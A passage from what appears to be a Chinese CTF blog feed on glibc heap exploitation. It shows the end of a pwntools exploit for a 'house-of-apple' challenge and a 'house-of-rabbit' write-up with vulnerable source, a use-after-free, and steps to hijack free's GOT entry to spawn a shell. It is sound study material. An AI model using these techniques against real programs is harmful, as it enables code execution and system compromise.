punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>\t\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">=</span> <span class=\"token string\">b'h'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x531</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x001eb0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>\t\t\t\tedit<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>\t\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>\t\t\t\tlg<span class=\"token punctuation\">(</span><span class=\"token string\">'point_guard_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>\t\t\t\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>\t\t\t\tresponse <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>\t\t\t\tflag <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre>\t\t\t\t<span class=\"token comment\"># log.info(flag.decode())</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">'flag'</span> <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>\t\t\t\t\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>\t\t\t<span class=\"token keyword\">except</span> EOFError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>\t\t\t\tlog<span class=\"token punctuation\">.</span>warning<span class=\"token punctuation\">(</span><span class=\"token string\">\"Connection lost, restarting the process.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>\t\t\t\tr<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>\t\t\t<span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>\t\t\t\tlog<span class=\"token punctuation\">.</span>warning<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"An error occurred: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>\t\t\t\tr<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyMjYtaG91c2Utb2YtYXBwbGUy\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#226-house-of-apple2</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjczNDE4Lmh0bQ==\">https://bbs.kanxue.com/thread-273418.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTI5MzQ/dGltZV9fMTMxMT1HcUd4dUQ5UWklM0RleGx4eDJEVXhZcUdLaXRxZTFRNzdPWllvRCN0b2MtOA==\">https://xz.aliyun.com/t/12934?time__1311=GqGxuD9Qi%3Dexlxx2DUxYqGKitqe1Q77OZYoD#toc-8</span></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-apple"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "url": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "title": "house-of-rabbit",
            "date_published": "2024-07-26T02:03:08.000Z",
            "content_html": "<h1 id=\"house-of-rabbit\"><a class=\"markdownIt-Anchor\" href=\"#house-of-rabbit\">#</a> house-of-rabbit</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写、 <code>use after free</code> 、 <code>edit after free</code></p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— <code>2.31</code></li>\n<li>超过  <code>0x400</code>  大小的堆分配</li>\n<li>可以写  <code>fastbin</code>  的  <code>fd</code>  或者  <code>size</code>  域</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>通过将 chunk 置入 fastbin 内，修改其 fd 指向 fake chunk，然后分配或释放大块，触发 <code>malloc_consolidate</code> ，此时 fake chunk 被放置到 unsortedbin 或对应的 smallbins 或 largebins 内</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">FASTBIN_CONSOLIDATION_THRESHOLD</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token number\">65536UL</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> FASTBIN_CONSOLIDATION_THRESHOLD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">have_fastchunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li><code>2.26</code>  加入了  <code>unlink</code>  对  <code>presize</code>  的检查</li>\n<li><code>2.27</code>  加入了  <code>fastbin</code>  的检查</li>\n</ul>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<blockquote>\n<p>该利用技巧的核心是  <code>malloc_consolidate</code>  函数，当检测到有  <code>fastbin</code>  的时候，会取出每一个  <code>fastbin chunk</code> ，将其放置到  <code>unsortedbin</code>  中，并进行合并。</p>\n</blockquote>\n<p>one:</p>\n<ul>\n<li>申请  <code>chunk A</code> 、 <code>chunk B</code> ，其中  <code>chunk A</code>  的大小位于  <code>fastbin</code>  范围</li>\n<li>释放  <code>chunk A</code> ，使其进入到  <code>fastbin</code></li>\n<li>利用  <code>use after free</code> ，修改  <code>A-&gt;fd</code>  指向地址  <code>X</code> ，需要伪造好  <code>fake chunk</code> ，使其不执行  <code>unlink</code>  或者绕过  <code>unlink</code></li>\n<li>分配足够大的  <code>chunk</code> ，或者释放  <code>0x10000</code>  以上的  <code>chunk</code> ，只要能触发  <code>malloc_consolidate</code>  即可</li>\n<li>此时  <code>fake chunk</code>  被放到了  <code>unsortedbin</code> ，或者进入到对应的  <code>smallbin/largebin</code></li>\n<li>取出  <code>fake chunk</code>  进行读写即可</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>申请两个 fastbin 大小的 chunk，A，B，C。C 隔断 top_chunk</li>\n<li>freeA，B</li>\n<li>修改 A 的 fastbin chunk 的 <code>大小</code> ，使其包裹 B</li>\n<li>触发 <code>malloc_consolidate</code></li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG91c2Utb2YtcmFiYml0\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/house-of-rabbit</span></p>\n<p><img data-src=\"/img/house-of-rabbit/image-20240726081440063.png\" alt=\"image-20240726081440063\"></p>\n<blockquote>\n<p>题目源码我稍微修改一下，所以直接放源码吧。</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v3 <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Add>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lu\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA00000LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">13337</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>flags <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFFFFFFFFFFFFF70LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            flags <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>v3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"idx>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">&amp;&amp;</span> ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>很明显只能申请 0x10、0x80、0xA00000 和 0xFFFFFFFFFFFFFF70 大小的 chunk 块，最多申请 9 次</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">del</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Del>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>存在 uaf 漏洞</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">edt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Edt>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"addr>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>fake<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以往 fake 地址处写，因此可以在 fake 处伪造 fakechunk，并可以修改 fd</p>\n<p>并且程序存在 system</p>\n<ol>\n<li>利用  <code>malloc consolidation</code>  机制去在 buffer 中获得一个 unsortedbin chunk，计算好位置，使得申请巨大内存后，切割下来的 chunk 刚好位于指针数组边上</li>\n<li>通过修改 buffer，使其大小小于 <code>0xA00010</code>  且大于 <code>0x80000</code> ，使该 chunk 通过 sort 过程进入 largebin</li>\n<li>申请巨大内存得到分割后的 chunk 位于指针数组边上，修改指针为 got [‘free’]，向其中写入内存 plt [‘system’]，劫持 free 函数，然后释放一个写有 <code>/bin/sh</code>  的 chunk，拿到 shell</li>\n</ol>\n<p>过程和原因一步一步的讲吧：</p>\n<h5 id=\"1malloc-consolidation\"><a class=\"markdownIt-Anchor\" href=\"#1malloc-consolidation\">#</a> <strong>1.malloc consolidation</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0x10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span 